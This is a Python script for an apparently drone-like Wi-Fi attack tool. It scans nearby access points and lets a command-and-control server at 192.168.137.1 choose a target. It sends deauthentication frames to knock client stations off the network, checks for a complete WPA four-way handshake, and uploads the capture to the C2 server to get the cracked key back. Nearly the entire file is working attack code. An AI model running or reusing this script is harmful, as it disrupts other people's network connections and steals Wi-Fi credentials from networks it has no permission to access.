import subprocess
import time
import os
import socket
import tqdm
import sys

import AccessPoint, Station

host = "192.168.137.1"
port = 1234
SEPARATOR = "<SEPARATOR>"
BUFFER_SIZE = 4096
filename = "handshake-01.cap"


attackMode = 0
retries = 5
monitorTime = str(15)

# 0 is passive, 1 is active


def bToString(arg):
    return ''.join(map(chr, arg))


def sendReceiveMessage(code, message):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        s.send(f"{code}{SEPARATOR}{message}".encode())
        received = s.recv(1024)
        s.close()
        return bToString(received)


def sendReceiveHandshake():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        print("Connected to c2 server")
        s.send(f"{2}{SEPARATOR}xxx".encode())
        filesize = os.path.getsize("handshake-01.cap")
        #print("Sending file data")
        s.send(f"{filename}{SEPARATOR}{filesize}".encode())
        
        f = open(filename, "rb")
        while True:
            bytes_read = f.read(BUFFER_SIZE)
            if not bytes_read:
                break
            s.sendall(bytes_read)
            
        f.close()
        print("File uploaded, awaiting key")
        key = s.recv(1024)
        s.close()
        return key


def startMonitor(iInterface):
    wifiInterfaces = (bToString(subprocess.check_output(['sudo', 'airmon-ng'])))
    wifiInterfaces = (wifiInterfaces.split("\n"))
    interface = None
    for i in range(2, len(wifiInterfaces)):
        if wifiInterfaces[i].__contains__(iInterface):
            interface = wifiInterfaces[i].split("\t")
            interface = interface[1]
            break
    if interface is None:
        print("Unable to find interface")
        exit()

    if interface.__contains__("mon"):
        print("Interface already in monitor mode")
        return interface

    print("Placing interface: " + interface + " into monitor mode")
    # print(subprocess.run(['sudo', 'airmon-ng','check','kill']))
    try:
        statusCheck = bToString(subprocess.check_output(['sudo', 'airmon-ng', 'start', interface]))
        if statusCheck.__contains__("ERROR"):
            print("Error starting module, process terminating")
            exit(0)
    except subprocess.CalledProcessError as e:
        print(e)
        print("Error starting module, process terminating")
        exit(0)

    wifiInterfaces = (bToString(subprocess.check_output(['sudo', 'airmon-ng'])))
    wifiInterfaces = (wifiInterfaces.split("\n"))
    for i in range(2, len(wifiInterfaces)):
        if wifiInterfaces[i].__contains__(iInterface):
            interface = wifiInterfaces[i].split("\t")
            interface = interface[1]
            break
    print("Monitor mode started, interface now: " + interface)
    return interface


def APScan(interface):
    print("Starting access point scan")
    subprocess.Popen(
        ['sudo', 'timeout', monitorTime, 'airodump-ng', '--ignore-negative-one', '-w', 'dumpFile', '--output-format', 'csv',
         interface], stdout=subprocess.DEVNULL)
    time.sleep(int(monitorTime))
    print("AP scan finished")
    dumpFile = open("dumpFile-01.csv", "r")
    data = dumpFile.readlines()
    dumpFile.close()
    os.remove("dumpFile-01.csv")
    accessPoints = []
    for i in range(2, len(data)):
        if data[i] != "" or data[i] != "\n":
            splitData = data[i].split(',')
            if len(splitData) > 1 and splitData[0] != 'Station MAC':
                accessPoints.append(AccessPoint.AccessPoint(splitData))
            elif splitData[0] == 'Station MAC':
                break
    print("Found", len(accessPoints), "access points")
    return accessPoints


def stationScan(target, interface):
    print("Searching for targets on " + target.getSSID())
    if attackMode == 0:
        # passive attack
        print("WIP")
        exit()
    elif(int(attackMode) == 1):
        print("Finding stations to attack")
        subprocess.Popen(
            ['sudo', 'timeout', monitorTime, 'airodump-ng', '--ignore-negative-one', '--bssid', target.getMAC(), '-c',
             target.getChannel(), '-w', 'targetConnections', '--output-format', 'csv', interface],
            stdout=subprocess.DEVNULL)
        time.sleep(int(monitorTime))
        targetConnection = open("targetConnections-01.csv", "r")
        targetConnections = targetConnection.readlines()
        targetConnection.close()
        os.remove("targetConnections-01.csv")
        stations = (targetConnections[targetConnections.index(
            "Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs\n") + 1:-1])
        targetStations = []
        for each in stations:
            targetStations.append(Station.Station(each.split(',')))
        targetStations.sort(key=lambda x: x.getPackets(), reverse=True)
        print("Found", len(targetStations), "stations on the target network")
        for targetedStation in targetStations:
            if stationDeauth(target, targetStations[0], interface):
                return True


def stationDeauth(target, targetedStation, interface):
    # attack stations sequentially until one gives a handshake
    # start with the most active
    # sends 2 deauths per second
    # start monitor, end when the deauth
    for i in range(0, retries):
        print("Starting deauth attack on " + target.getMAC() + " against station " + targetedStation.getMAC())
        subprocess.Popen(
            ['sudo', 'timeout', '10', 'airodump-ng', '--bssid', target.getMAC(), '-c', target.getChannel(),
             '-w', 'handshake', '--output-format', 'cap', interface], stdout=subprocess.DEVNULL)
        subprocess.Popen(['sudo', 'timeout', '3', 'aireplay-ng', '--deauth', '1', '-a', target.getMAC(), '-c',
                          targetedStation.getMAC(), interface], stdout=subprocess.DEVNULL)
        time.sleep(10)
        print("Attack completed")
        if verifyHandshake():
            return True


def verifyHandshake():
    keyCheck = subprocess.run(['tshark', '-r', 'handshake-01.cap', '-Y', 'eapol'], capture_output=True)
    keyCheck = bToString(keyCheck.stdout).split('\n')
    print(keyCheck)
    keys = [0, 0, 0, 0]
    if len(keyCheck) > 3:
        for each in keyCheck:
            # match keys
            if sum(keys) == 4:
                break
            elif each.__contains__("Message 1"):
                keys[0] = 1
            elif each.__contains__("Message 2"):
                keys[1] = 1
            elif each.__contains__("Message 3"):
                keys[2] = 1
            elif each.__contains__("Message 4"):
                keys[3] = 1
        if sum(keys) == 4:
            print("Full handshake captured")
            return True
            # sendReceiveHandshake()
        else:
            print("Partial handshake captured")
            print(keys)
            os.remove("handshake-01.cap")
            return False
    else:
        print("Failed to capture full handshake")
        os.remove("handshake-01.cap")
        return False


def main():
    # exploit -m 1 -r 5 -l 30 -i interface

    Interface = None

    if len(sys.argv) < 3:
        print("Too few arguments, provide the interface")

    else:
        i = 1
        while i < len(sys.argv):
            if sys.argv[i] == "-m":
                global attackMode 
                attackMode = sys.argv[i + 1]
            elif sys.argv[i] == "-r":
                global retries
                retries = int(sys.argv[i + 1])
            elif sys.argv[i] == "-l":
                global monitorTime 
                monitorTime = str(sys.argv[i + 1])
            elif sys.argv[i] == "-i":
                Interface = sys.argv[i + 1]
            i += 2

        Interface = startMonitor(Interface)
        attackIndex = -1
        while int(attackIndex) == -1:
            accessPoints = APScan(Interface)
            attackMACs = []
            for each in accessPoints:
                attackMACs.append(each.getSSID())
                attackMACs.append(each.getMAC())
            # select which AP to attack
            attackIndex = sendReceiveMessage(1, attackMACs)
            
        targetedAP = accessPoints[int(attackIndex)]
        capturedHandshake = stationScan(targetedAP, Interface)
        if capturedHandshake:
            key = sendReceiveHandshake()
            print(key)
        else:
            print("Failed to capture handshake")

    subprocess.check_output(['sudo', 'airmon-ng', 'stop', Interface])
    print("Warship Program Complete")
    exit()


main()

# subprocess.check_output(['sudo', 'ifconfig','wlan0','down'])


# subprocess.check_output(['sudo', 'ifconfig','wlan0','up'])
